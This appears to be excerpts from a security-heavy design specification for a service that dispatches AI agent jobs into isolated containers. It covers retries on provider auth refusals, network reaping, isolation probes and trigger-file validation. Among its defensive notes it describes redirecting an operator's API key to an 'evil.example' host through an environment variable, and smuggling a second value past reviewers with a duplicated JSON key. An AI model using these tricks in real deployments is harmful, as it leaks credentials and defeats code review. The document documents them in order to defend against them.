...
- **Contract, container → worker**:
  ...
  **The runner needs BOTH a `try`/`catch` AND `stopReason` handling — they cover disjoint failure sets.**
  ...
  | **The provider refused the credential or access** (HTTP 401 / 403, issue #437) | `stopReason: "error"` whose `errorMessage` matches one of `providerAuthRefused`'s CLOSED anchored shapes: `401`/`403` followed by a space or `:` at position 0 (the Anthropic and openai SDKs' `${status} ${message}`, pi-ai's unprefixed `<status>: <body>`, pi-messages' `<status> <statusText>: <message>`), or the fixed prefixes `OpenAI API error (401\|403): `, `Azure OpenAI API error (401\|403): ` and `Mistral API error (401\|403): `, **and** that pi-ai's own `isRetryableAssistantError` (from the pinned copy pi dispatches through) does NOT call transient | `2` / `provider-auth-refused`: the worker hands the container the same key on every attempt, so a retry pays for a container to rediscover the refusal. The retry-predicate guard exists because a 403 is also what a gateway sends while it is down: OpenRouter's `403: {"message":"Provider returned error",...}` and an HTML 403 "please retry your request" page match the shape and stay `1`. No predicate (none found in the pinned copy, logged as `retry_predicate_unavailable`) means every provider error stays `1`. Every pinned chat family (the ten of pi-ai 0.80.7's `KnownApi`) is driven into a 401 and a 403 by a loopback table (`image/runner/test/pinned-api.test.mjs`) that also asserts the table covers exactly that union. **Refusals read as `2`**: anthropic-messages, openai-completions, openai-responses, azure-openai-responses, mistral-conversations, pi-messages. **Residuals, still `1` and retried until attempts run out**, each by observation: `google-generative-ai` and `google-vertex` (the raw JSON body is the message, the status inside it); `bedrock-converse-stream` (`AccessDeniedException: 403: ...`, the SDK exception name first); `openai-codex-responses` (the body's own message, no status at all). `openrouter-images` is pi-ai's images api and never ends a chat turn, so it is out of scope. Anchoring is the point: an unanchored `401` would read `500 upstream said 401` or a proxy's `Proxy response (403) !== 200 when HTTP Tunneling` as a refusal and stop retrying a transient failure, the costlier of the two mistakes |
  ...
  **Named residuals of the provider-refusal row (issue #437), none of which the runner can see:**
  - A provider's IN-STREAM error (the HTTP exchange answered 200 and the failure arrived as an event) whose
    own text begins with `401 ` or `403 ` is read as a status by the anchored shape. Nothing on the terminal
    message says which channel the text came from.
  - An overlay `models.json` `apiKey: "!cmd"` runs its command once and pi caches the output for the
    process. A short-lived token that expires mid-job now ends the job as `2` / `provider-auth-refused`,
    where before the job retried and the new container ran the command again and got a fresh token. The
    operator's fix is a token that outlives the 30-minute job ceiling.
  - Google's actual answer to a bogus key is HTTP **400** `API_KEY_INVALID`, not a 401, so it is outside
    the 401/403 row entirely and retries with the rest of the google residual.
  - A genuine refusal whose body happens to carry one of pi-ai's retry words (a `500` inside a request id,
    `timeout` in prose) is called transient by the predicate and retries. That is the guard erring in the
    cheap direction, on purpose. Measured in review against random request ids alone, the share of genuine refusals
    that read as transient is 0.048% for Anthropic `req_` ids, 4.3% for 32-hex ids and 3.2% for UUIDs.

  **One mitigation beside them, which is not a residual:** the exit line's `message` is capped at 2000
  characters AS SERIALIZED (a quote or newline costs two, a control byte six), cut on whole code points,
  with a `... [truncated N chars]` marker, on both exit-line paths. An HTML error page therefore cannot
  push the line's `code` and `reason` out of the worker's 8 KiB tail: the worst-case line (the maximal
  ledger, `context`, the longest session reason and a capped message) is held under 6 KiB by a test that
  pins the 2000 literal.

  **The job user cannot read its own inputs (issue #341)** is a named reason under the EXISTING policy code,
  for every job, prompt or command:
...
- **Why**: This exit code **is** the mechanism `CONST-RETRY-INFRA-ONLY` is implemented by. The worker
  ...
  *retryable*.
  The one place the runner DOES read pi's error text on the loop side is the provider-refusal row of the
  table above (issue #437), and it is built to the same caution: a CLOSED list of anchored shapes, each
  proved against the pinned artifact, and a veto by pi-ai's own retry predicate, never an open-ended
  vocabulary.
...
- **Contract**:
  - **Which daemon (issue #278).** Every `docker` spawn inherits the worker's environment, so the daemon is
    whichever endpoint the docker CLI resolves (`DOCKER_HOST`, else `DOCKER_CONTEXT`, else the config's
    `currentContext`). The worker asks the CLI (`docker context inspect --format={{json .Name}}|{{json .Endpoints.docker.Host}}`)
    at boot and before each job's spend, never reads `DOCKER_HOST` itself, and passes no `env` to the endpoint
    read or to the job's `docker run`, so both describe the same CLI. The answer gates `local`'s
    `credentialTransit` (`DES-CONTAINER-BACKEND-REGISTRY`): an endpoint not observed on this host is logged
    (`docker_endpoint_not_local`, with the URL's credentials never shown: the value is reduced to `scheme://host` or withheld whole, never edited or stripped, per `DES-CONTAINER-BACKEND-REGISTRY`), reported in `worker_started`, and refused
  ...
  - **What the daemon is observed to provide (issue #345).** The `docker info --format={{json .}}` read the job user
    is decided from (`DES-JOB-USER-INFERRED-READ-BACK-ON-REQUEST`), made on every platform and cached per endpoint
    state, feeds two more observations. `daemonAppliesBounds` (`PidsLimit` and `MemoryLimit` both true, on a daemon
    that is neither rootless nor Podman) gates `local`'s `isolation`. `runtimeAddsNoMounts` gates `mountSet`: `true`
    on Docker, and on rootful Podman only when `/etc/containers/mounts.conf` exists and is empty, no `volumes`,
    `mounts`, `devices` or `hooks_dir` key (in any TOML spelling or letter case; an escaped key counts as one) appears in
    `/usr/share/containers/containers.conf`, `/etc/containers/containers.conf` or a `*.conf` in the four drop-in
    directories, no `*.json` hook sits in `/usr/share/containers/oci/hooks.d` or `/etc/containers/oci/hooks.d`, every
    one of those that exists is readable, `/proc/sys/crypto/fips_enabled` is not `1`, and the service's socket is a
    unix path on this host. A `docker info` that parsed to no known shape, or no docker CLI at all, is an answered
    `false`. Both are reported in `worker_started`, logged as
    `runtime_observed` when a job's read differs, and refused only under a `PI_BACKEND_FLOOR` asking `enforced` for
    the property: at boot (a read that did not answer exits 1, an answered miss exits 2) and per job as
    `backend-floor-unobserved` (an unanswered read retries). The forge comment names each missed observation in
    fixed words; the evidence goes to the log only.
  - **A container that outlives its `docker run` (issue #345).** Every job argv carries `--cidfile=<job dir>.cid`,
    beside the job directory and never inside `/job`, removed before the run (the CLI refuses an existing file)
    and after it; `--cidfile` is refused in `dockerExtra`. When `docker run` exits with a never-started code (125,
    126, 127) and the worker did not abort it, the cidfile is read. No ID, or nothing listed by
    `docker ps -a --no-trunc --filter id=<id>`, is never-started as before; a container listed `created` is removed
    and still never-started. Any other answer, `ps` failing or timing out included, means this attempt's container
    may run on (measured: killing Podman's API service mid-job exits the CLI 125 while the container keeps
    running), so it is stopped and removed by ID, each step asked again for up to 10 s while it fails, and the job fails
    as INFRA `container-detached`: retried, and NOT refunded, because a container started. A plain name conflict writes no cidfile and is never touched.
  ...
  - **The pinned namespaces (issue #354).** The Podman builder follows `--userns=keep-id` with `--pid=private`,
    ...
    The network's OPTIONS are not pinned and cannot be: containers.conf `pasta_options` are appended to the command
    line's, so one that maps host loopback reaches an egress-off job (`DES-PODMAN-NATIVE-ROOTLESS-BACKEND`, issue #428).
  - **The user-namespace field (issue #354, the seam for a native Podman backend).** The spec carries `userns`,
    ...
    `local` argv is exactly what it was. The Podman builder (`podmanArgsFromSpec`, `buildPodmanRunArgs`) emits
    `--userns=keep-id` immediately after `--user=` and refuses a spec without both: keep-id with no `--user` runs as
    the image's own user with the worker's gid as a supplementary group and cannot read a `0700` `/job` (measured on
    rootless Podman 5.8.1). The job path's runtime binary is a seam (`bin`, `docker` by default) in `run-container`,
    the image and egress preflights, the network helpers, the stop and the reaper, and the native `podman` venue
    builds every job with the Podman builder and `bin: "podman"` (issue #354, `DES-PODMAN-NATIVE-ROOTLESS-BACKEND`):
    `--user=<worker euid>:<egid>`, always, then `--userns=keep-id`, with `HOME=/home/pi`, and `relabel` from
    `podman info`'s `selinuxEnabled`.
  ...
  - **User: non-root, and the uid the job's files belong to (issue #341).** On macOS, Windows and Docker
    ...
    user without that HOME. Rootless daemons, userns-remap, a root worker and Docker Desktop on Linux (not WSL)
    are refused by name (at boot when `local` is the default venue and the boot read answers in time, per job
    otherwise), as are an image without `anyUid` for another uid (`job-image-any-uid-unsupported`) and a
    `--user` whose gid is 0 or the docker socket's group. Decided from facts, never a probe container:
  ...
  - **`--network=pi-job-<jobId>-net`, present unless `PI_EGRESS=0`, and its OWN network per job.**
    ...
    **outage** -- every job dies at its first turn. The flag alone is not enough inside the runner either
    (issue #427): loading the pinned pi replaces the dispatcher it installs, so the runner re-installs an
    env-proxy one from pi's own `undici` right after pi is loaded, whenever `NODE_USE_ENV_PROXY=1`. `docs/sandbox.md` recorded the opposite (that pi's
  ...
  - **The same module answers `doctor`'s different question, and it is a different question** (issue
    ...
    the real `process.env` too, so it is the candidate half of the question and never the value half).
    `doctor` has to NAME a variable that is *not* set, which that call cannot
    do: it filters by presence, and its single `undefined` conflates "no such provider" with "known
    provider, nothing set". `providerKeyCandidates(provider)` recovers pi's own list by calling
    `findEnvKeys` against an environment in which every variable is present, so the filter is the identity
    — pi's table, in pi's precedence order, without a copy of it existing anywhere here. The presence test
    is then made **against the injected env by this project, never by pi**: `getProviderEnvValue` falls
  ...
  - **Sourcing the key from pi's `auth.json` is a credential *source*, not a new injection path, and is ON by
    ...
    — `apiKeyVariable(providerKeyCandidates(provider))`, pi's whole list narrowed by the one credential fact
    above, so no hand table and no convention. It stays a HOST-SIDE read of a
  ...
  - **What `auth.json` holds is a pi CONFIG VALUE, and this service can only forward a literal** (issue
    #311). pi reads a stored key through `resolveConfigValue(cred.key, cred.env)`: a leading `!` runs the
    rest as a **shell command** and takes stdout, `$VAR`/`${VAR}` interpolate from the environment, and
    `$$`/`$!` escape. An environment variable is read raw, through no such grammar. So a login stored in any
    of those forms, forwarded verbatim, arrives in the container as its own source text and every job of
    that deployment spends a container to fail auth, with `doctor` green because the field is a non-empty
    string. Such a credential is **refused pre-spend**. Resolving it here was considered and rejected twice
    over: running the command host-side would execute operator shell out of a credential file, once per
    job, in the worker; and interpolating the variable form would be reimplementing a grammar pi does not
    export, which is `no-reimplementing-pi` and the same trap this issue is about. The test is a deliberate
    **superset** of pi's parse (any `$`, not a parse of one): a key pi would pass through unchanged contains
    neither character, and over-refusing costs nothing where under-refusing costs a container.
    `cred.key` must also be a **string**: pi validates no schema on that file, and the old truthiness guard
    let an object through to become `-e ANTHROPIC_API_KEY=[object Object]`.
  - **A credential's companion settings (`cred.env`) are refused when they cannot arrive.** `cred.env` is a
    `Record<string, string>` of provider config, not a variable-name hint, and for both Cloudflare providers
    pi returns **no auth at all** without `CLOUDFLARE_ACCOUNT_ID` (plus `CLOUDFLARE_GATEWAY_ID` for the
    gateway). The container env is a closed set, so those names do not ride along with the key. pi *does*
    fall back to the ambient environment for them, which makes `PI_FORWARD_ENV` a real answer rather than a
    shrug, so the refusal is scoped to the names that will not arrive and a deployment already forwarding
    them is untouched. This became reachable for twelve providers at once when the variable-name defect
    above was fixed, which is why it is closed in the same change rather than after the first failed job.
  - **A provider pi authenticates without a key variable is told that, not told to set one.** The refusal
    splits the two facts the way `doctor` does and in the same order (candidates first, catalog second,
    because `radius` has a key variable and no catalog entry): in `piProviders()` with no candidates means
    pi authenticates it another way and the closed env has no door; absent from the catalog means
    `PI_PROVIDER` names a provider pi does not have. One message for both told an `amazon-bedrock` operator
    to "set it in the worker environment manually", which is the thing `doctor` correctly calls impossible.
  - **On the env path the NAMES come from pi and the VALUES come from the env the resolver was handed, and
    those are not the same question** (issue #311). It used to ask both with one
    `findEnvKeys(provider, hostEnv)`, whose presence test falls back to the real `process.env` — pi's own
    behaviour, neither wanted nor prevented here — so a name could be "present" on the strength of the
    machine and then be read out of an env that does not carry it, yielding `{ NAME: undefined }`: a
    credential-shaped result with no credential in it, and no fall through to the `auth.json` login that
    would have worked. It now asks the hermetic `providerKeyCandidates` and filters by what the given env
    holds, which is the same set by construction and does not ask the leaky question at all.
    **Reachability, stated rather than implied**: in the shipped worker `hostEnv` IS `process.env`
    (`cli.mjs` → `startWorker` → `makeRunContainerFn`), where the two agree by identity and the old code
  ...
  - **The home must be writable by the non-root runtime user, and by ANY non-root uid when the image claims
    ...
    `ensureFileExists()`), and playwright, npm and gh write their caches and config under the same home.
    ...
    **Inversely, the guardrails, the runner, `node_modules`, and the browser cache are root-owned and NOT
    ...
    Only the home is agent-writable, because pi must write `auth.json` there. Everything the agent
...
- **Evidence (upstream)**: `earendil-works/pi @ 5e336cf → packages/ai/src/env-api-keys.ts:69-71 → getApiKeyEnvVars`
  ...
  `undefined` for **both** "no such provider" and "none of them set", which is the conflation
  `providerKeyCandidates` plus `piProviders` exists to undo · `GOOGLE_API_KEY` appears in **no** pi table
  at the pin (`google` reads `GEMINI_API_KEY`; `GOOGLE_CLOUD_API_KEY` belongs to `google-vertex`), and
  `gemini` is not one of the 35 ids `getBuiltinProviders()` returns
...
- **Contract**:
  ...
  - **Objects, and their names are the contract**:
    ...
    |---|---|---|
    | per-job network | `pi-job-<jobId>-net` | `--internal`. Created at job start, removed at job end, or by the next boot's reaper when a worker died before it could (see below). Exactly two members: the job container and the proxy. |
    ...
    **What is left behind, and what removes it** (issues #357, #350). Every network here is removed by the
    ...
    them matched the full shape its producer builds. That sentence was TRUE of all four when it was written,
    including the boot reaper, whose network half was then `^pi-job-.*-net$`; widening that half here is what
    made it false, and the disagreement between the two halves is the REASON for the widening rather than the
    reason the sentence stopped holding. The boot reaper asks a **prefix** of both halves
    ...
    prefix, and no charset rule separates them, because the ids reaching `jobContainerName` are BullMQ's
    `[A-Za-z0-9._-]` and are deliberately not re-sanitised, so `runner_default` is a legal one. The alternative
    ...
    never the CLI's text at all. A pass-level FAULT is different, and this sentence used to claim otherwise
    (issue #339): it carries the thrown error's own message, because across the twelve sites that share this
    treatment that message is as often a filesystem fault an operator needs (`EACCES: permission denied`, a
    factory that is not a function) as it is the CLI's, and a fixed token there would delete the diagnosis to
    protect three of them. Every such message goes through `scrubCredentials` (`worker/src/redact.mjs`)
    first, which is what keeps a `DOCKER_HOST` or `CONTAINER_HOST` credential repeated in it out of the log,
    including the fragment Go's parser echoes a second time in its own words; that helper's residual, a
    credential holding whitespace or a quote that a runtime printed UNQUOTED, which neither runtime does, is
    named at its declaration rather than claimed away; `doctor --live`'s peer sweep reports a network it could not REMOVE and stays
    silent on one it could not READ, because it is best effort behind a flag the operator typed. What each PROTECTS differs, and that is the part that must not be flattened: the boot reaper
    ...
    and named, never removed: the proxy is shared and long-lived, and a stranger under this namespace is not
    the canary's to delete. Measured: a live stranger lost its only network and kept running.
    `INT-LIVE-PROBE-CONTRACT` states the same for its sibling and this bullet did not (issue #360). "Named"
    holds on every outcome the sweep reports, which took two goes: the pass that added the line for a network
    that VANISHED between the removal and the check named only the probes it had removed, so a stranger
    detached in that same pass went unreported, and with no probe of this run's own to remove there was no
    line at all. Both verbs are in that line now. The one thing the sweep still says nothing about is a
    network it did nothing to, which is the silence it shares with the boot reaper.

    **WHAT COUNTS AS ATTACHED IS TWO QUESTIONS, and the boot reaper now asks both** (issue #379, item 1).
    `docker network inspect`'s `.Containers` lists RUNNING endpoints, which is exactly what the daemon
    guards: with one attached, `network rm` refuses by itself. It lists nothing for a member that is
    `created` or `exited`, and the `rm` then succeeds -- after which that member can never start again,
    because it holds a network id the daemon no longer has. Measured on docker 27.4.0 for both states. So
    the reaper asks `ps -a --filter network=` as well, and any member whose state is outside
    `ENDPOINT_LISTED_STATES` (an allowlist: `running`, `paused`) keeps the network, reported as
    `network_not_reaped {reason: "container-attached-not-running", containers}`. A membership question the
    daemon will not answer is `containers-unreadable` and also keeps it. The CONTAINER half is deliberately
...
- **Contract**:
  ...
  - **A sandbox joins the job's kind of network**, through the same builder seam that already delivers
    ...
    the network out from under a shell an operator is sitting in. **This holds for BOTH entry points because
    both go through one function** (issue #277): `openSandbox` owns every step from a job id to a running
    shell that decides what the container can reach -- `resolveSandbox`'s refusals, the already-running
    ...
    network. A deployment that disables egress only in its `.env` gets a refusal naming the proxy (fail
    closed) that says where the setting is read. The CLI keeps only what is about its own arguments: the terminal check,
    `--publish` and `--pin`. **The network's lifecycle**: removed after the shell exits; LEFT when docker
    still lists the sandbox as running after the shell returned (a detach); and a network already under the
    session's name when it is created -- left by a session whose process died before its `finally`, by a
    detached sandbox that has since exited, or belonging to an open of the same run in progress -- is REFUSED
    (`egress-network-exists`) with the commands to remove it, never removed automatically, because a second
    open removing it stripped the proxy from the first open's live shell (tried and withdrawn under #277). The
    boot reaper sweeps only `pi-job-` networks, and since issue #337 the SANDBOX retention reaper sweeps these:
    a session network is removed once its run is neither running nor still retained, so its lifetime is the
    retained directory's rather than unbounded. The refusal above is unchanged and still the rule at OPEN
    time -- removing one there was tried and withdrawn under #277 because two opens race, and this sweep is a
    different mechanism with a different input, keyed on the directory listing its pass began with, which no
    open in progress can be absent from. The guard it carries gates the DETACH rather than the removal:
    docker itself refuses to remove a network a live container is on, so the harm a sweep can actually do is
    stripping the proxy off a session that is open, and a `pi-sandbox-` container attached stops that. An
    `egress` posture that is not a boolean throws rather than defaulting to the bridge. Both the CLI and the
    panel read the posture from their own process environment, never a deployment's `.env`, and
    since issue #337 the panel SAYS so on the RUN_DETAIL line rather than leaving the operator to know
    it: the posture it resolved, and that it read it here rather than from the deployment (`OQ-038`).
  ...
  - **The same sweep reclaims the session NETWORK, on the directory's clock** (issue #337). After the
    ...
    **The keep set is a UNION of two listings**, the one the pass began with and a fresh one, and neither
    ...
    `resolveSandbox` refuses every run that resolves the SAME root, and skipping there would mean never
    sweeping on the host most likely to be holding leftovers. The qualifier is not pedantry: an opener
    computes its own root from its own environment, which `docs/sandbox.md` already says routinely differs
    from the deployment's, so a worker whose root is missing while an operator's CLI resolves a populated one
    sweeps with an empty keep set. The harm is bounded to a leftover removed early, since the next open
    simply creates the network again, and an open in flight is still held by the container look below.
...
- **Why**: The 5% case (`REQ-RESURRECTABLE-SANDBOX`). Every choice above exists to keep the *job*
  ...
  reaper exemption, and a second reaper rather than a widened log sweep. That last one is what issue #337
  leaned on: the session network needed a sweep, and it went into this reaper because this is the one that
  asks docker what is live before it deletes.
...
- **Acceptance**: The sandbox argv contains every member of `ISOLATION_FLAGS` (asserted against the
  ...
  `buildSandboxRunArgs` THROWING, so no caller can assemble an argv that publishes a port docker will not
  bind. A
  ...
  of those is disconnected from what is on it and removed with a plain `network rm`. **That `docker ps -a`
  gates BOTH destructive verbs**: it is re-asked immediately before the detach and again immediately before
  the `network rm`, so the act that kills a launch is always one command after a fresh answer, whatever the
  endpoint count. It used to be asked once, before a detach loop that pushed the removal one command further
  out per endpoint, and the detach is the act that strips a live session's proxy. A check-then-act still has
...
short-lived containers that run no agent, are given nothing, and exist to be read. `pi-dispatch doctor --live`
is its only entry point (`worker/src/live-probes.mjs`, driven from `doctor.mjs`).
...
- **Contract**:
  ...
  - **Four kinds of container, one phase each, removed at the end of their phase** (issue #344 added the last two):
    ...
    policy off, or the proxy down, the peers and their networks are not made at all.
  ...
  - **Shown first, removed by ID.** Doctor prints every container's name, the image, the peer networks and the proxy
    they attach when those will be made, and the fixture location before the first docker command after the endpoint
    re-read. ONE ownership
    ...
    or not anything was read back; the name fallback and the container and fixture sweeps are best effort and
    ...
    **What an interrupted run leaves, the next removes, and says so**: fixtures of exactly `mkdtemp`'s shape that
    are real directories, containers of any live-probe kind by name shape, and peer networks by name shape, in
    every case only for a PID no longer alive. What it SAYS is narrower than that, and the distinction is
    load-bearing rather than pedantic: a removal it attempted and could not complete is a ⚠ carrying the
    command, while a network it could not READ is passed over in silence -- this is best effort behind a
  ...
  - **The reads**, each a verdict `{ property, ok, warn?, detail }`, where `warn` means NOT READ BACK and is never
    ...
    - `mountSet`: `docker inspect .Mounts` keyed by destination and read-write flag against the spec's own
      ...
      ancestor of it, or the session store fails. Then (issue #345) the reading container's own
      `/proc/self/mountinfo`, read by a constant `cat`: a mount point that is neither declared nor on the runtime's
      fixed list fails `runtime-mount` (rootful Podman's `/run/secrets`, which `.Mounts` does not list, measured).
      The list is EXACT paths (`/`, `/etc/resolv.conf`, `/etc/hostname`, `/etc/hosts`, `/usr/sbin/docker-init`,
      `/sbin/docker-init`, `/run/podman-init`, `/run/.containerenv`) plus `/proc`, `/dev` and `/sys` by path
      segment, where a mount of a disk, network or host-share filesystem type (ext4, xfs, btrfs, nfs, virtiofs,
      fakeowner and the like) still fails, since the runtimes' own masks there are `proc`, `sysfs`, `tmpfs` or
      Podman's `overlay` (measured). All but `/sbin/docker-init` (where older Docker mounts its init) were measured
      with the builder's argv on Docker Desktop, rootful Docker and rootful Podman. A mountinfo read that failed or
      held no mount line is not read back; a mount point is printed only in printable bytes.
    ...
    - `imagePinning`: the builder's argv, detached, against `pi-dispatch-live-probe.invalid/absent:<nonce>`. It
      holds only for a nonzero exit, the runtime's absent-image words (`No such image` from Docker, `image not known`
      from Podman, measured on 5.8.1), no pull announced (`Unable to find image` from Docker, `Trying to pull` from
      Podman), and the image still absent afterwards; a refusal in other words is not read back.
    - `ephemeral` (issue #344): the first run is waited on with `docker ps -a --no-trunc --filter id=` until it is
      ...
      the second run start under the same name and get the same wait. A run still listed and stopped (`exited`,
      `dead`, or Podman's `stopped`) at the deadline fails `survived`; a second run the daemon refuses in its own
      name-conflict words (`already in use`, on Docker and Podman alike) after the first was seen gone fails
      `name-held`, and one that printed its own ID and then failed is not a held name; a second run given the
      first's ID fails `reused`; a second run that finds the first's marker in its own `/tmp` fails `residue`. A run that did not start, one still running at the deadline, a `ps`
      that did not answer, or a missing workspace marker is not read back.
    - `jobToJobIsolation` (issue #344): the constant `CONNECT_SCRIPT` tries each target at once with a 3 s bound and
      prints one word per target (`reached` when the nonce came back, `connected` when something accepted without
      it, else the error code or `timeout`); a line whose word is not a plain lower-case word is dropped. Peer2 runs
      it against its own ADDRESSES (the `IPAddress` and `GlobalIPv6Address` fields `docker inspect` gives it on its
      network); then peer1 runs it against the proxy's port and every name and address of peer2; then peer2 again.
      Peer2 reached fails `reached`, whatever else is missing. Otherwise it holds only when at least one address was
      tried (a name alone proves DNS scoping, not routing), every target answered, peer1 reached the proxy (an
      unreached peer on a network that reaches nothing proves nothing), peer2 reached itself at EVERY address BEFORE
      the attempt (a listener not yet up refuses the connection, which would read as a block) and AFTER it (so it
  ...
  - **Rootful Podman through its Docker API is not another venue**: it is `local`, and this module runs there
    unchanged (measured on Podman 5.8.2; `DES-PODMAN-THROUGH-ITS-DOCKER-API`). Under `podman-docker` no endpoint is
    observed, so nothing runs.
  - **The native `podman` venue reads back through this same module** (issue #354,
    `DES-PODMAN-NATIVE-ROOTLESS-BACKEND`), when a host blesses it: `runLiveProbes` with the `podman` CLI as its runner
    and in every command a note names, `buildPodmanRunArgs` as the builder of all four container kinds, and
...
- **Acceptance**: The probe argv contains every member of `ISOLATION_FLAGS` (asserted against the imported
  ...
  addresses, jobToJobIsolation fails; given peer1 unable to reach the proxy, no address for peer2, or peer2 silent
  to itself before or after the attempt, it is not read back; given a second ephemeral run refused in words other
  than a name conflict, or one that printed its own ID and failed, it is not `name-held`; every peer is removed
  before its network, no network is removed with `-f`, and a stale peer network with a live-probe container on it
  is left alone. Given a mount point in the container's `/proc/self/mountinfo` that is neither declared nor on the fixed
...
- **`run.kind` selects the forge; `on.type` is shared.** A label is a label and a comment is a comment on
  ...
  `label_updated|opened|synchronized|reopened|closed`, and `azure` takes `created|updated` — each
  in that forge's own words, so an operator can grep their own documentation for them. Forgejo's
  `label_updated` is GitHub's `labeled` and its `synchronized` is `synchronize`: a one-letter difference
  an operator would otherwise meet as a trigger that loads clean and never fires. `label_cleared` is
  deliberately absent and always will be, because REMOVING a label must never start a paid run and it has
  no GitHub counterpart to inherit that rule from. Azure has neither a label action (tags attach to work
  items, never to pull requests) nor a close word at all, which is why an azure close rule is refused
  rather than silently never matching: an abandon arrives as a plain `updated` that
  `INT-AZURE-PAYLOAD-SUBSET` cannot tell from any other update. GitLab has no
...
- **`run.secrets` (ALL FOUR trigger kinds, optional map of env-var name to opaque reference) and
  ...
  **`secret-name-reserved` reserves every variable pi reads for the job's provider, set on this host or
  ...
  so the set comes from `providerKeyCandidates` and never from a presence filter. The presence-filtered
  form was empty on every deployment whose credential lives in pi's `auth.json` rather than the
  environment. That is not the default *source* (the environment is tried first) but it is the default
  *fallback*: `PI_AUTH_FROM_PI` is on unless set to `0`, so any deployment that has run `pi login` and not
  put the key in `.env` is in this case. Its `undefined` arrived as `?? []`, so the empty set was silent:
  a trigger could bind the provider's own credential variable, `buildContainerEnv` writes the credential
  first and the trigger's value second, and every job of that trigger spent the trigger author's key. It
  also reserves the provider's OAuth variable, which the worker never WRITES (`apiKeyVariable` skips it
  deliberately) and which pi reads BEFORE the API key, so a presence filter held it only on hosts that
  happened to export it. `.env.example` offers `ANTHROPIC_OAUTH_TOKEN` by name, so "no host sets it" would
  be false; the point is that a gate must not depend on whether this one does. The set is bounded to the job's OWN provider: an
  `anthropic` job may still bind `OPENAI_API_KEY` for a flow that talks to OpenAI, because refusing that
  would be this project claiming a namespace it does not own.

  **A THIRD family is refused at LOAD, and it is about where the request goes rather than whose key pays
  for it** (issue #314). A trigger may not bind a variable pi or its provider SDK reads to CONFIGURE a
  provider. Substitution spends the trigger author's money; redirection sends the OPERATOR's credential to
  a host the trigger chose, and it was ungated. Measured at the pin, with a stubbed fetch and no key:
  `AZURE_OPENAI_BASE_URL=https://evil.example/openai/v1` sends the request there **carrying `api-key`**,
  and `AZURE_OPENAI_RESOURCE_NAME=evilcorp` does the same via `evilcorp.openai.azure.com`. That is not a
  shadowed default: every azure model ships `baseUrl: ""`, so the environment is the PRIMARY source there,
  ahead of both the resource name and the model.
...
- **`run.waitFor` (webhook kinds only, optional array of 1..4 one-key condition objects)**: the conditions
  ...
  **A DUPLICATE key refuses the whole file, anywhere in it** (issue #313), and the entry above is the
  precedent it extends. `JSON.parse` accepts a duplicate and silently keeps the LAST value, so
  `"flow": "safe", "flow": "evil"` runs `evil` while a reviewer reading top to bottom sees `safe`. That is
  not a field that does nothing, it is a field whose reviewed value and effective value differ, and it
  defeats the review rather than the runtime -- which matters here more than it would anywhere else,
  because `CONST-TRIGGER-AUTHOR-GATE` treats a merged change to this file as the gate and
  `DES-PER-TRIGGER-SECRET-PROFILE` rests on this file being the reviewed artifact. The reach is the whole
  schema, not one field: `run.flow`, `run.command`, `on.type`, a scoped limit, a `run.secrets` reference,
  and `triggers` itself.
  Detected by a scan of the raw TEXT, because `JSON.parse`'s reviver is called ONCE for a duplicated key,
  with the winning value already resolved, and Node 22's `context.source` gives only that value's own
  text: neither can tell a duplicate from a single occurrence. The scan runs only on text the parse has
  already ACCEPTED, so it never has to decide whether malformed input is malformed, and "not valid JSON"
  stays the first thing an operator is told. Keys are compared DECODED, because a key written plainly and
  the same key written as a `u00`-style escape are one key to `JSON.parse` and two to a byte comparison,
  which is the spelling an attacker would use.
  The refusal also guards the raw reads on the two WRITE paths in `triggers-file.mjs`, which never reach
  the validator. The disarm path is the sharper one: it parses, collapses the duplicate to its last value
  and then rewrites the whole file from the parsed array, so recording one disarm would delete the
  shadowed key from disk permanently -- the destruction that path's own comment forbids, arriving through
  the door the comment thought it had closed. On both write paths the scan runs only after the parse
  succeeded, so an unparseable file is still repaired from empty and is not misreported as a shadowed one.
  **The read-only raw readers are deliberately left alone** (`readDisarmState`, `makeCheckWaitSkew`).
  Both are documented fail-open, neither writes, and both fold every mismatch to "run", so the residual is
  that they read shadowed bytes during the window in which the loaders are already refusing to start.
  **So is the console's DISPLAY loader** (`admin/src/read-model.mjs` `readTriggers`), which degrades rather
  than refusing by design and therefore renders the winning value with no marker. That is the surface an
  operator sees rendered rather than as text, so it is the one that misleads most convincingly; it is
  named here rather than closed, because closing it is a panel change and not a loader one.
...
- **Contract**:
  ...
  **`host` (issue #57) is additive, nullable, an explicit literal, and TAIL position** -- every prior
  ...
  placement that leaves twenty-four existing positions untouched. It is UNCONDITIONAL rather than a
  conditional spread, on the `tokens`/`usage`/`session` precedent that null-with-the-key-present is this
  record's normal case; a sometimes-absent key would be a shape change where a null is a value change.
  Its admissibility has to engage this record's own sentences rather than sidestep them. The PII-free
  property rests on holding NO ATTACKER-CHOSEN STRING, and `host` satisfies that absolutely: no path
  exists from a webhook payload, an issue body, a branch name or a folder to this value, it is fixed once
  at boot from one environment variable, and its charset excludes `/` and `\\` so it cannot even be
  path-shaped -- which is the property `targetFor` drops a local folder to its basename to obtain. What it
  is NOT is anonymous, and that is stated rather than glossed: the default is the machine's hostname, and
  on a personal machine a hostname is often a person's name. The honest word is **operator-disclosed** --
  the operator names their own machines, this record is written to their own disk, that name is already on
  ...
  **resolved** name, `run.backend` else the deployment default (`PI_BACKENDS[0]`), computed by
  ...
  one fact that refusal is about. That includes a venue this worker never BUILT (a producer on a newer build
  naming one this build does not know): the registry's `containerName` refuses such a name at pickup, and the
  processor catches that refusal, by its code and nothing else, rather than letting it skip the record, so the
  job is refused and recorded instead of retried as an infrastructure failure. ABSENT means the key is absent: an explicit `null` is a
  name the blessed gate refuses, and the record stores it as `null` rather than claiming the default. Admissibility is the argument `processor.mjs` already makes where it logs
...
- **Acceptance**: Given a job reaching a terminal state, exactly one `.json` keyed by its sanitized job
  ...
  record a wired worker writes for a job whose data names a venue or none, `backend` is a string equal to
...
- **The venue stamp** (issue #277): one backend name beside the transcript, naming the venue whose container
  ...
  `null` resolve leaves nothing readable under the job dir unless that removal fails too. What
  `venue-changed` does not distinguish is stated rather than hidden: it also names a leftover sentinel from
  an interrupted promotion, an unreadable stamp, and a
  SAME-venue promotion whose sentinel is in place when another job reads or re-checks the stamp (that job
  cold-starts once), exactly as `pi-version-changed` already covers an unreadable version stamp.
  **The resolve path stages the transcript from ONE DESCRIPTOR, and re-checks the name after it** (issues
  #336 and #375). It opens the canonical transcript once, compares that descriptor's `dev:ino:size:mtime`
  with what the gates judged, streams the staged copy off the same descriptor bounded by the judged size,
  and then asks the name again: still a real directory, still this venue, still the judged transcript.
  NEITHER HALF SUBSUMES THE OTHER, and each was found by removing it. The descriptor answers a swap that
